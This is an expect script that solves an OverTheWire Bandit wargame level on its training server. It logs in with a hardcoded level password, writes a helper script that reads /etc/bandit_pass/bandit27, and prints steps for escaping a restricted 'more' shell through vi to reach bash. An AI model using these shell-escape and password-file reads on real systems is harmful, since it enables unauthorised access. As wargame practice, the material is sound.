#!/usr/bin/expect -f

spawn ssh -p 2220 bandit25@bandit.labs.overthewire.org
expect "*: "
send "uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG\r"
expect "*\$ "

send "cat /etc/passwd | grep bandit26\r"
expect "*\$ "
send "file /usr/bin/showtext\r"
expect "*\$ "
send "cat /usr/bin/showtext\r"
expect "*\$ "
send "ls ../bandit26/\r"
expect "*\$ "

send "echo \"cat /etc/bandit_pass/bandit27\" > /tmp/exploit27.sh\r"
expect "*\$ "
send "chmod +x /tmp/exploit27.sh\r"
expect "*\$ "

send_user "by resizing the terminal to a tiny size, 'more' will not finish immediately\n"
send_user "if your terminal is causing grief, this can be done with tmux by creating a pane that is small\n"
send_user "ssh in with command 'ssh -o \"StrictHostKeyChecking no\" -i bandit26.sshkey bandit26@localhost'\n"
send_user "type 'v' to get into vi, then ':set shell=/bin/bash'. without this, shell escape just reshows the more page\n"
send_user "finally :shell to open a shell as user bandit26, and run './bandit27-do /tmp/exploit27.sh'\n"

send "\r"

interact